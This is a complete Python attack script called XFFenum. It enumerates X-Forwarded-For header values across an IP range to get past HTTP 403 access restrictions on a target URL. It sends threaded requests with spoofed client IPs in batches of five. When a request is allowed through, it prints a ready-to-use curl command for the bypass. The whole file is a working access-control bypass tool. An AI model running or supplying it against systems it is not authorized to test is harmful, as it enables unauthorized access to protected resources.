#!/usr/bin/python3.6

import iptools
import argparse
from tqdm import tqdm
from itertools import zip_longest
from concurrent.futures import ThreadPoolExecutor
from requests_futures.sessions import FuturesSession


def banner():
    print(
        """ __  _______ _____                          
 \ \/ /  ___|  ___|__ _ __  _   _ _ __ ___  
  \  /| |_  | |_ / _ \ '_ \| | | | '_ ` _ \ 
  /  \|  _| |  _|  __/ | | | |_| | | | | | |
 /_/\_\_|   |_|  \___|_| |_|\__,_|_| |_| |_|
 X-Forwarded-For [403 forbidden] enumeration\n"""
    )


def parse_args():
    parser = argparse.ArgumentParser(
        description="X-Forwarded-For [403 forbidden] enumeration",
        epilog="Have a nice day :)",
    )
    parser.add_argument(
        "-u", dest="url", help="Forbidden URL patch to scan", required=True
    )
    parser.add_argument(
        "-i", dest="ip_range", help="Signe IP or range to use", required=True
    )
    parser.add_argument(
        "-t",
        dest="threads",
        help="number of threads (default: 5)",
        default="5",
        type=int,
    )
    parser.add_argument(
        "--no-verify-ssl",
        help="Ignore any and all SSL errors.",
        default=False,
        dest="no_verify_ssl",
        action="store_true",
    )
    return parser.parse_args()


def http_status(url, ip_list):
    http_headers = {
        "Cache-Control": "no-cache, must-revalidate",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
        "X-Forwarded-For": ip_list,
    }
    future = session.get(
        url=url,
        headers=http_headers,
        allow_redirects=False,
        verify=not args.no_verify_ssl,
    )
    response = future.result()
    if response.status_code != 403:
        return ("1", ip_list)
    else:
        return ("0", "0")


def generate_ips(ip_range):
    try:
        ip_addresses = iptools.IpRangeList(args.ip_range)
        return ip_addresses
    except:
        ip_start = ip_range.split("-")[0]
        ip_end = ip_range.split("-")[1]
        return iptools.IpRange(ip_start, ip_end)


if __name__ == "__main__":
    banner()

    args = parse_args()
    session = FuturesSession(executor=ThreadPoolExecutor(max_workers=args.threads))

    print("[i] Using URL:", args.url)
    print("[i] Using IP range:", args.ip_range)
    ip_addresses = generate_ips(args.ip_range)
    print("[i] IP addresses in range:", len(ip_addresses))
    print("[i] Iterations required:", int(-(-len(ip_addresses) // 5)), "\n")

    # Get 5 Ips at a time because of 100 chars header value limitation
    for ips in tqdm(zip_longest(*[iter(ip_addresses)] * 5, fillvalue="")):
        ip_list = ", ".join(filter(None, ips))
        (result, ip_list) = http_status(args.url, ip_list)
        if result == "1":
            print("\n\n[!] Access granted with", ip_list)
            print("[!] curl", args.url, '-H "X-Forwarded-For:', ip_list + '"')
            break
